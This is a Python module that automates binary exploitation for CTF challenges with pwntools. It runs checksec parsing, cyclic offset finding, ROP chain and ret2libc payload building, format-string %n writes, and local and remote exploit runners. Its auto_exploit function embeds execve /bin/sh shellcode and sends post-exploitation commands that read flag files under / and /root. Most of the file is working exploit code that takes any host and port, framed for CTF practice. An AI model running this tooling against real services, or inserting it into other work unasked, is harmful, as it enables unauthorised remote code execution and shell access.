"""Binary exploitation module — pwntools automation for CTF pwn challenges.

Handles common binary exploitation tasks:
- checksec: parse binary protections (NX, PIE, canary, RELRO)
- Buffer overflow: cyclic pattern, offset finding, payload generation
- ROP chains: automatic gadget finding and chain building
- Format strings: automatic format string exploitation
- Shell interaction: pwntools process/remote wrapper

Usage:
    from bugbounty_ctf.pwn import PwnToolkit

    pt = PwnToolkit(binary_path="./vuln")
    protections = pt.checksec()
    offset = pt.find_offset()
    payload = pt.build_rop_chain(offset, ["system", "/bin/sh"])
    pt.exploit_remote("target.htb", 1337, payload)
"""

from __future__ import annotations

import os
import re
import subprocess
from dataclasses import dataclass
from typing import Any

try:
    from pwn import (
        ELF,
        ROP,
        context,
        cyclic,
        cyclic_find,
        fmtstr_payload,
        p64,
        process,
        remote,
        u64,
    )

    HAS_PWNTOOLS = True
except ImportError:
    HAS_PWNTOOLS = False


@dataclass
class BinaryProtections:
    """Binary protection status."""

    arch: str = "unknown"
    nx: bool = False
    pie: bool = False
    canary: bool = False
    relro: str = "unknown"
    fortify: bool = False

    def to_dict(self) -> dict[str, Any]:
        return {
            "arch": self.arch,
            "nx": self.nx,
            "pie": self.pie,
            "canary": self.canary,
            "relro": self.relro,
            "fortify": self.fortify,
        }


@dataclass
class ExploitResult:
    """Result from an exploitation attempt."""

    success: bool = False
    offset: int = 0
    payload: bytes = b""
    output: str = ""
    flag: str = ""
    method: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "success": self.success,
            "offset": self.offset,
            "payload_length": len(self.payload),
            "output": self.output[:500],
            "flag": self.flag,
            "method": self.method,
        }


FLAG_PATTERNS = [r"HTB\{[^}]+\}", r"flag\{[^}]+\}", r"CTF\{[^}]+\}", r"pwn\{[^}]+\}"]


def _extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for pattern in FLAG_PATTERNS:
        flags.extend(re.findall(pattern, text, re.IGNORECASE))
    return list(set(flags))


class PwnToolkit:
    """Binary exploitation automation using pwntools.

    Requires pwntools to be installed: pip install pwntools
    """

    def __init__(self, binary_path: str | None = None, *, arch: str = "amd64") -> None:
        self.binary_path = binary_path
        self.arch = arch
        self.elf: Any = None
        self.rop: Any = None
        self.protections = BinaryProtections()

        if not HAS_PWNTOOLS:
            print("[!] pwntools not installed — install with: pip install pwntools")

        if binary_path and HAS_PWNTOOLS:
            context.arch = arch
            try:
                self.elf = ELF(binary_path)
                self.rop = ROP(self.elf)
                self.protections = self._parse_protections()
            except Exception as e:
                print(f"[!] Failed to load binary: {e}")

    def checksec(self) -> BinaryProtections:
        """Parse binary protections using checksec or pwntools ELF."""
        if self.elf:
            return self._parse_protections()

        if self.binary_path and os.path.exists(self.binary_path):
            return self._checksec_subprocess()

        return self.protections

    def _parse_protections(self) -> BinaryProtections:
        """Parse protections from pwntools ELF object."""
        p = BinaryProtections()
        if self.elf:
            p.arch = self.elf.arch
            p.nx = self.elf.nx
            p.pie = self.elf.pie
            p.canary = self.elf.canary
            p.relro = (
                "full" if self.elf.relro == "Full" else ("partial" if self.elf.relro else "none")
            )
            p.fortify = bool(self.elf.fortify)
        return p

    def _checksec_subprocess(self) -> BinaryProtections:
        """Run checksec as subprocess."""
        try:
            result = subprocess.run(
                ["checksec", "--file=" + str(self.binary_path)],
                capture_output=True,
                text=True,
                timeout=10,
            )
            output = result.stdout + result.stderr
            p = BinaryProtections()
            p.nx = "NX enabled" in output
            p.pie = "PIE enabled" in output
            p.canary = "Canary found" in output
            if "Full RELRO" in output:
                p.relro = "full"
            elif "Partial RELRO" in output:
                p.relro = "partial"
            else:
                p.relro = "none"
            return p
        except Exception:
            return BinaryProtections()

    def find_offset(self, *, target_host: str | None = None, target_port: int = 0) -> int:
        """Find buffer overflow offset using cyclic pattern.

        If target_host is provided, tests against a remote service.
        Otherwise, runs the binary locally.
        """
        if not HAS_PWNTOOLS:
            return 0

        pattern = cyclic(500)

        if target_host:
            io = remote(target_host, target_port)
        elif self.binary_path:
            io = process(self.binary_path)
        else:
            return 0

        try:
            io.sendline(pattern)
            io.wait()
            core = io.core
            if core:
                fault_addr = core.fault_addr
                offset = cyclic_find(
                    fault_addr if isinstance(fault_addr, int) else u64(fault_addr[:4])
                )
                print(f"[+] Offset found: {offset}")
                return int(offset)
        except Exception as e:
            print(f"[-] Offset finding failed: {e}")
        finally:
            io.close()

        return 0

    def build_rop_chain(
        self,
        offset: int,
        gadgets: list[str] | None = None,
        *,
        function: str = "system",
        arg: str = "/bin/sh",
    ) -> bytes:
        """Build a ROP chain payload.

        Args:
            offset: Buffer overflow offset
            gadgets: List of function names to call
            function: Target function (system, execve, etc.)
            arg: Argument to pass to the function

        Returns:
            Payload bytes
        """
        if not HAS_PWNTOOLS or not self.rop:
            return b"A" * offset

        payload = b"A" * offset

        try:
            if function == "system":
                bin_sh = next(self.elf.search(arg.encode()), 0)
                self.rop.call("system", [bin_sh])
            elif function == "execve":
                bin_sh = next(self.elf.search(arg.encode()), 0)
                self.rop.call("execve", [bin_sh, 0, 0])
            else:
                self.rop.call(function, [arg])

            payload += self.rop.chain()
            print(f"[+] ROP chain built ({len(payload)} bytes)")
        except Exception as e:
            print(f"[-] ROP chain failed: {e}")
            payload += p64(0xDEADBEEF)

        return bytes(payload)

    def build_ret2libc(
        self,
        offset: int,
        libc_path: str,
        *,
        target_host: str | None = None,
        target_port: int = 0,
    ) -> bytes:
        """Build ret2libc payload with leaked libc address."""
        if not HAS_PWNTOOLS:
            return b"A" * offset

        if self.elf and self.elf.got:
            puts_plt = self.elf.plt.get("puts", 0)
            puts_got = self.elf.got.get("puts", 0)

            payload = b"A" * offset
            payload += p64(puts_plt)
            payload += p64(self.elf.symbols.get("main", 0))
            payload += p64(puts_got)

            print("[*] Stage 1: leak libc address via puts(puts@got)")
            return bytes(payload)

        return b"A" * offset

    def exploit_local(
        self, payload: bytes, *, post_commands: list[str] | None = None
    ) -> ExploitResult:
        """Run exploit against local binary."""
        if not HAS_PWNTOOLS or not self.binary_path:
            return ExploitResult(success=False, method="local")

        result = ExploitResult(method="local")
        io = process(self.binary_path)

        try:
            io.sendline(payload)
            if post_commands:
                for cmd in post_commands:
                    io.sendline(cmd.encode())
            output = io.recvall(timeout=5).decode("utf-8", errors="replace")
            result.output = output
            flags = _extract_flags(output)
            if flags:
                result.flag = flags[0]
                result.success = True
                print(f"[FLAG] {flags[0]}")
            elif "$" in output or "#" in output:
                result.success = True
                print("[+] Got shell!")
        except Exception as e:
            result.output = str(e)
        finally:
            io.close()

        return result

    def exploit_remote(
        self,
        host: str,
        port: int,
        payload: bytes,
        *,
        post_commands: list[str] | None = None,
    ) -> ExploitResult:
        """Run exploit against remote target."""
        if not HAS_PWNTOOLS:
            return ExploitResult(success=False, method="remote")

        result = ExploitResult(method="remote")
        io = remote(host, port)

        try:
            io.sendline(payload)
            if post_commands:
                for cmd in post_commands:
                    io.sendline(cmd.encode())
            output = io.recvall(timeout=10).decode("utf-8", errors="replace")
            result.output = output
            flags = _extract_flags(output)
            if flags:
                result.flag = flags[0]
                result.success = True
                print(f"[FLAG] {flags[0]}")
            elif "$" in output or "#" in output:
                result.success = True
                print("[+] Got shell!")
        except Exception as e:
            result.output = str(e)
        finally:
            io.close()

        return result

    def format_string_exploit(
        self,
        target_host: str,
        target_port: int,
        *,
        target_addr: int = 0,
        target_value: int = 0,
        max_offset: int = 20,
    ) -> ExploitResult:
        """Automatic format string exploitation.

        Finds the format string offset, then writes target_value to target_addr.
        """
        if not HAS_PWNTOOLS:
            return ExploitResult(success=False, method="format_string")

        result = ExploitResult(method="format_string")

        # Find format string offset
        io = remote(target_host, target_port)
        try:
            io.sendline(b"AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
            response = io.recvline(timeout=5).decode("utf-8", errors="replace")
            io.close()

            offset = 0
            for i, part in enumerate(response.split(".")):
                if "41414141" in part:
                    offset = i + 1
                    break

            if offset == 0:
                print("[-] Could not find format string offset")
                return result

            result.offset = offset
            print(f"[+] Format string offset: {offset}")

            if target_addr and target_value:
                # Write target_value to target_addr using %n
                writes = {target_addr: target_value}
                payload = fmtstr_payload(offset, writes)
                result.payload = payload

                io = remote(target_host, target_port)
                io.sendline(payload)
                output = io.recvall(timeout=5).decode("utf-8", errors="replace")
                result.output = output
                flags = _extract_flags(output)
                if flags:
                    result.flag = flags[0]
                    result.success = True
                io.close()

        except Exception as e:
            result.output = str(e)

        return result

    def auto_exploit(
        self,
        host: str,
        port: int,
        *,
        post_commands: list[str] | None = None,
    ) -> ExploitResult:
        """Automatic exploitation: find offset, build ROP, exploit."""
        if not self.binary_path:
            return ExploitResult(success=False, method="auto")

        print(f"\n[*] Auto-exploiting {host}:{port}")

        protections = self.checksec()
        print(
            f"    Protections: NX={protections.nx} PIE={protections.pie} "
            f"Canary={protections.canary} RELRO={protections.relro}"
        )

        if protections.canary:
            print("[!] Canary detected — need leak first")
            return ExploitResult(success=False, method="auto")

        offset = self.find_offset(target_host=host, target_port=port)
        if offset == 0:
            return ExploitResult(success=False, method="auto")

        if protections.nx:
            payload = self.build_rop_chain(offset)
        else:
            shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
            payload = b"A" * offset + shellcode

        default_commands = [
            "id",
            "cat /flag.txt 2>/dev/null",
            "cat /root/flag.txt 2>/dev/null",
            "find / -name 'flag*' 2>/dev/null | head -5",
        ]
        commands = post_commands or default_commands

        return self.exploit_remote(host, port, payload, post_commands=commands)
